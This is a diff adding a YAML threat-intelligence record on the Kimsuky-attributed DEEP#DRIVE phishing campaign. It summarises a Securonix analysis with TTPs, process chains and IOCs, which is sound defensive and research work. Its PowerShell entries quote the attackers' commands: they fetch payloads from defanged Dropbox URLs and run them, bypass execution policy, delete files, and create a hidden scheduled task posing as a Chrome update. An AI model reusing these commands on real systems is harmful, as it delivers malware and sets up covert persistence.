@@ -1,0 +1,65 @@
+summary: "The Securonix Threat Research team has been monitoring an ongoing campaign attributed to Kimsuky targeting South Korean business and government sectors. The DEEP#DRIVE attack campaign represents a sophisticated, multi-stage operation leveraging tailored phishing lures and PowerShell scripts for payload delivery, reconnaissance, and execution."
+date: "Feb 13, 2025"
+authors:
+  - Den Iuzvyk
+  - Tim Peck
+attribution: "Kimsuky (North Korean APT group)"
+malware_families:
+  - Telegram.exe (actually a .pptx file)
+TTPs:
+  processs:
+    - powershell.exe
+    - wget.exe
+  commandline:
+    - 'powershell.exe -ExecutionPolicy Bypass -File "user.ps1"'
+    - 'wget -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh'
+    - '& $hhh;'
+    - 'powershell.exe -ExecutionPolicy Bypass -File "temp.ps1"'
+    - 'Remove-Item -Path $aaa -Force'
+    - 'powershell.exe -ExecutionPolicy Bypass -File chrome.ps1'
+    - 'Register-ScheduledTask -TaskName "ChromeUpdateTaskMachine" -Action { powershell.exe -ExecutionPolicy Bypass -File "%AppData%\chrome.ps1" } -TriggerOnce -At (Get-Date).AddMinutes(5) -RepeatEvery 30 Minutes -Hidden'
+    - 'powershell.exe -ExecutionPolicy Bypass -File system_first.ps1'
+  powershell:
+    - |
+      $ss = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ss))
+      $ccc = Join-Path ([System.IO.Path]::GetTempPath()) "user.ps1";
+      $aaa | Out-File -FilePath $ccc;
+      & $ccc;
+      Remove-Item -Path $ccc -Force
+    - |
+      wget -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0" -OutFile $aaa; & $aaa; Remove-Item -Path $aaa -Force
+    - |
+      $hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Telegram.exe"; wget -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0" -OutFile $hhh; & $hhh
+    - |
+      $str = "..." #Obfuscated PowerShell code
+      $eee = Join-Path ($env:AppData) "temp.ps1"; wget -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/3br2y8fin0jqgrunrq3mf/cjfansgmlans1-f.txt?rlkey=rxnknu51ncb5xgnj2lyxu0xyu&st=ohfmyo4p&dl=0" -OutFile $eee; & $eee; Remove-Item -Path $eee -Force
+  registry_keys: []
+  network_connections:
+    - process: powershell.exe
+      port: null
+      destination:
+        - "dl.dropboxusercontent[.]com"
+  file_modifications:
+    - "%APPDATA%\user.ps1"
+    - "%APPDATA%\temp.ps1"
+    - "system_drive.dat"
+    - "Telegram.exe" # renamed from .pptx
+  persistence:
+    - Scheduled Task: ChromeUpdateTaskMachine (runs chrome.ps1 every 30 minutes)
+  pipes: []
+  process_relations:
+    - .lnk file -> powershell.exe -> user.ps1
+    - powershell.exe -> wget.exe -> Telegram.exe (.pptx)
+    - powershell.exe -> chrome.ps1
+    - chrome.ps1 -> temp.ps1
+    - temp.ps1 -> system_first.ps1
+
+IOCs:
+  - URLs:
+    - "hxxps://dl.dropboxusercontent[.]com/scl/fi/slx06ol4jmjqn16icggin/.pptx?rlkey=lky2lit5lpthkcscfnz3f91oa&st=gwpkys9h&dl=0"
+    - "hxxps://dl.dropboxusercontent[.]com/scl/fi/nanwt6elsuxziz05hnlt4/cjfansgmlans1-x.txt?rlkey=l6gzro1rswkqbk6tinxnkuylv&st=iv78c1cg&dl=0"
+    - "hxxps://dl.dropboxusercontent[.]com/scl/fi/3br2y8fin0jqgrunrq3mf/cjfansgmlans1-f.txt?rlkey=rxnknu51ncb5xgnj2lyxu0xyu&st=ohfmyo4p&dl=0"
+  - Files:
+    - Telegram.exe (renamed .pptx)
+    - system_drive.dat
+reference: https://www.securonix.com/blog/analyzing-deepdrive-north-korean-threat-actors-observed-exploiting-trusted-platforms-for-targeted-attacks/
